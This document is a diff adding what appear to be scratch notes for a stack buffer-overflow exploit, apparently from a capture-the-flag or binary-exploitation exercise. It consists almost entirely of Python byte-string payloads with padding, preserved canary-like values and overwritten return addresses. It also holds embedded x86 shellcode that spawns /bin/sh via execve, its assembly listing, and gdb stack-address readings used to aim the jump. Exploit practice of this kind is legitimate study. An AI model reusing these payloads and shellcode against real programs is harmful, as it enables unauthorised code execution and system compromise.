@@ -1,0 +1,60 @@
+MAGIC NUMBER: 982
+
+b'\x00'*11+
+b'\x7b\x47\x2d\x03'+
+b'0'*(126-11-4)+
+
+b'1'*39+
+b'\x56\x4a\x8c\x45'+
+b'1'*(280-39-4)+
+
+b'2'*161+
+b'\x62\xa5\x30\xb1'+
+b'2'*(250-161-4)+
+
+b'3'*230+
+b'\x61\xdd\x90\x73'+
+b'3'*(322-230-4)+
+b'\xb1\x85\x04\x08'
+
+
+b'0'*11+b'\x7b\x47\x2d\x03'+b'0'*(126-11-4)+b'1'*39+b'\x56\x4a\x8c\x45'+b'1'*(280-39-4)+b'2'*161+b'\x62\xa5\x30\xb1'+b'2'*(250-161-4)+b"\x31\xC0\xB0\x0B\x8D\x5C\x24\x1E\x31\xC9\x31\xD2\xCD\x80"+b'/bin/sh\x00' +b'3'*(230-22)+b'\x61\xdd\x90\x73'+b'3'*(322-230-4)+b'\x2e\xd6\xff\xff'
+
+li[0:0+11]+b'\x7b\x47\x2d\x03'+li[11:11+111]+li[122:122+39]+b'\x56\x4a\x8c\x45'+li[161:161+237]+li[398:398+161]+b'\x62\xa5\x30\xb1'+li[559:559+85]+b"\x31\xC0\xB0\x0B\x8D\x5C\x24\x1E\x31\xC9\x31\xD2\xCD\x80"+b'/bin/sh\x00' +li[644:644+230-22]+b'\x61\xdd\x90\x73'+li[874-22:874+88-22]+b'\x2e\xd6\xff\xff'
+
+
+xor eax, eax
+mov al, 0x0b
+lea ebx, [esp+34]
+xor ecx, ecx
+xor edx, edx
+int 0x80
+ret
+
+li[874-22:874+88-22]
+
+li[0:0+11]+
+b'\x7b\x47\x2d\x03'+
+li[11:11+111]+
+
+li[122:122+39]+
+b'\x56\x4a\x8c\x45'+
+li[161:161+237]+
+
+li[398:398+161]+
+b'\x62\xa5\x30\xb1'+
+li[559:559+85]+
+
+li[644:644+230]+
+b'\x61\xdd\x90\x73'+
+li[874:874+88]+
+b'\xb1\x85\x04\x08'
+
+
+
+(gdb) p $ebp  0xffffd764
+$1 = (void *) 0xffffd714 | 0xffffd714
+(gdb) p $esp             | 0xffffd61e
+$3 = (void *) 0xffffd5d2 | 0xffffd5ce
+(gdb) p/x $ebp-310
+$7 = 0xffffd5de
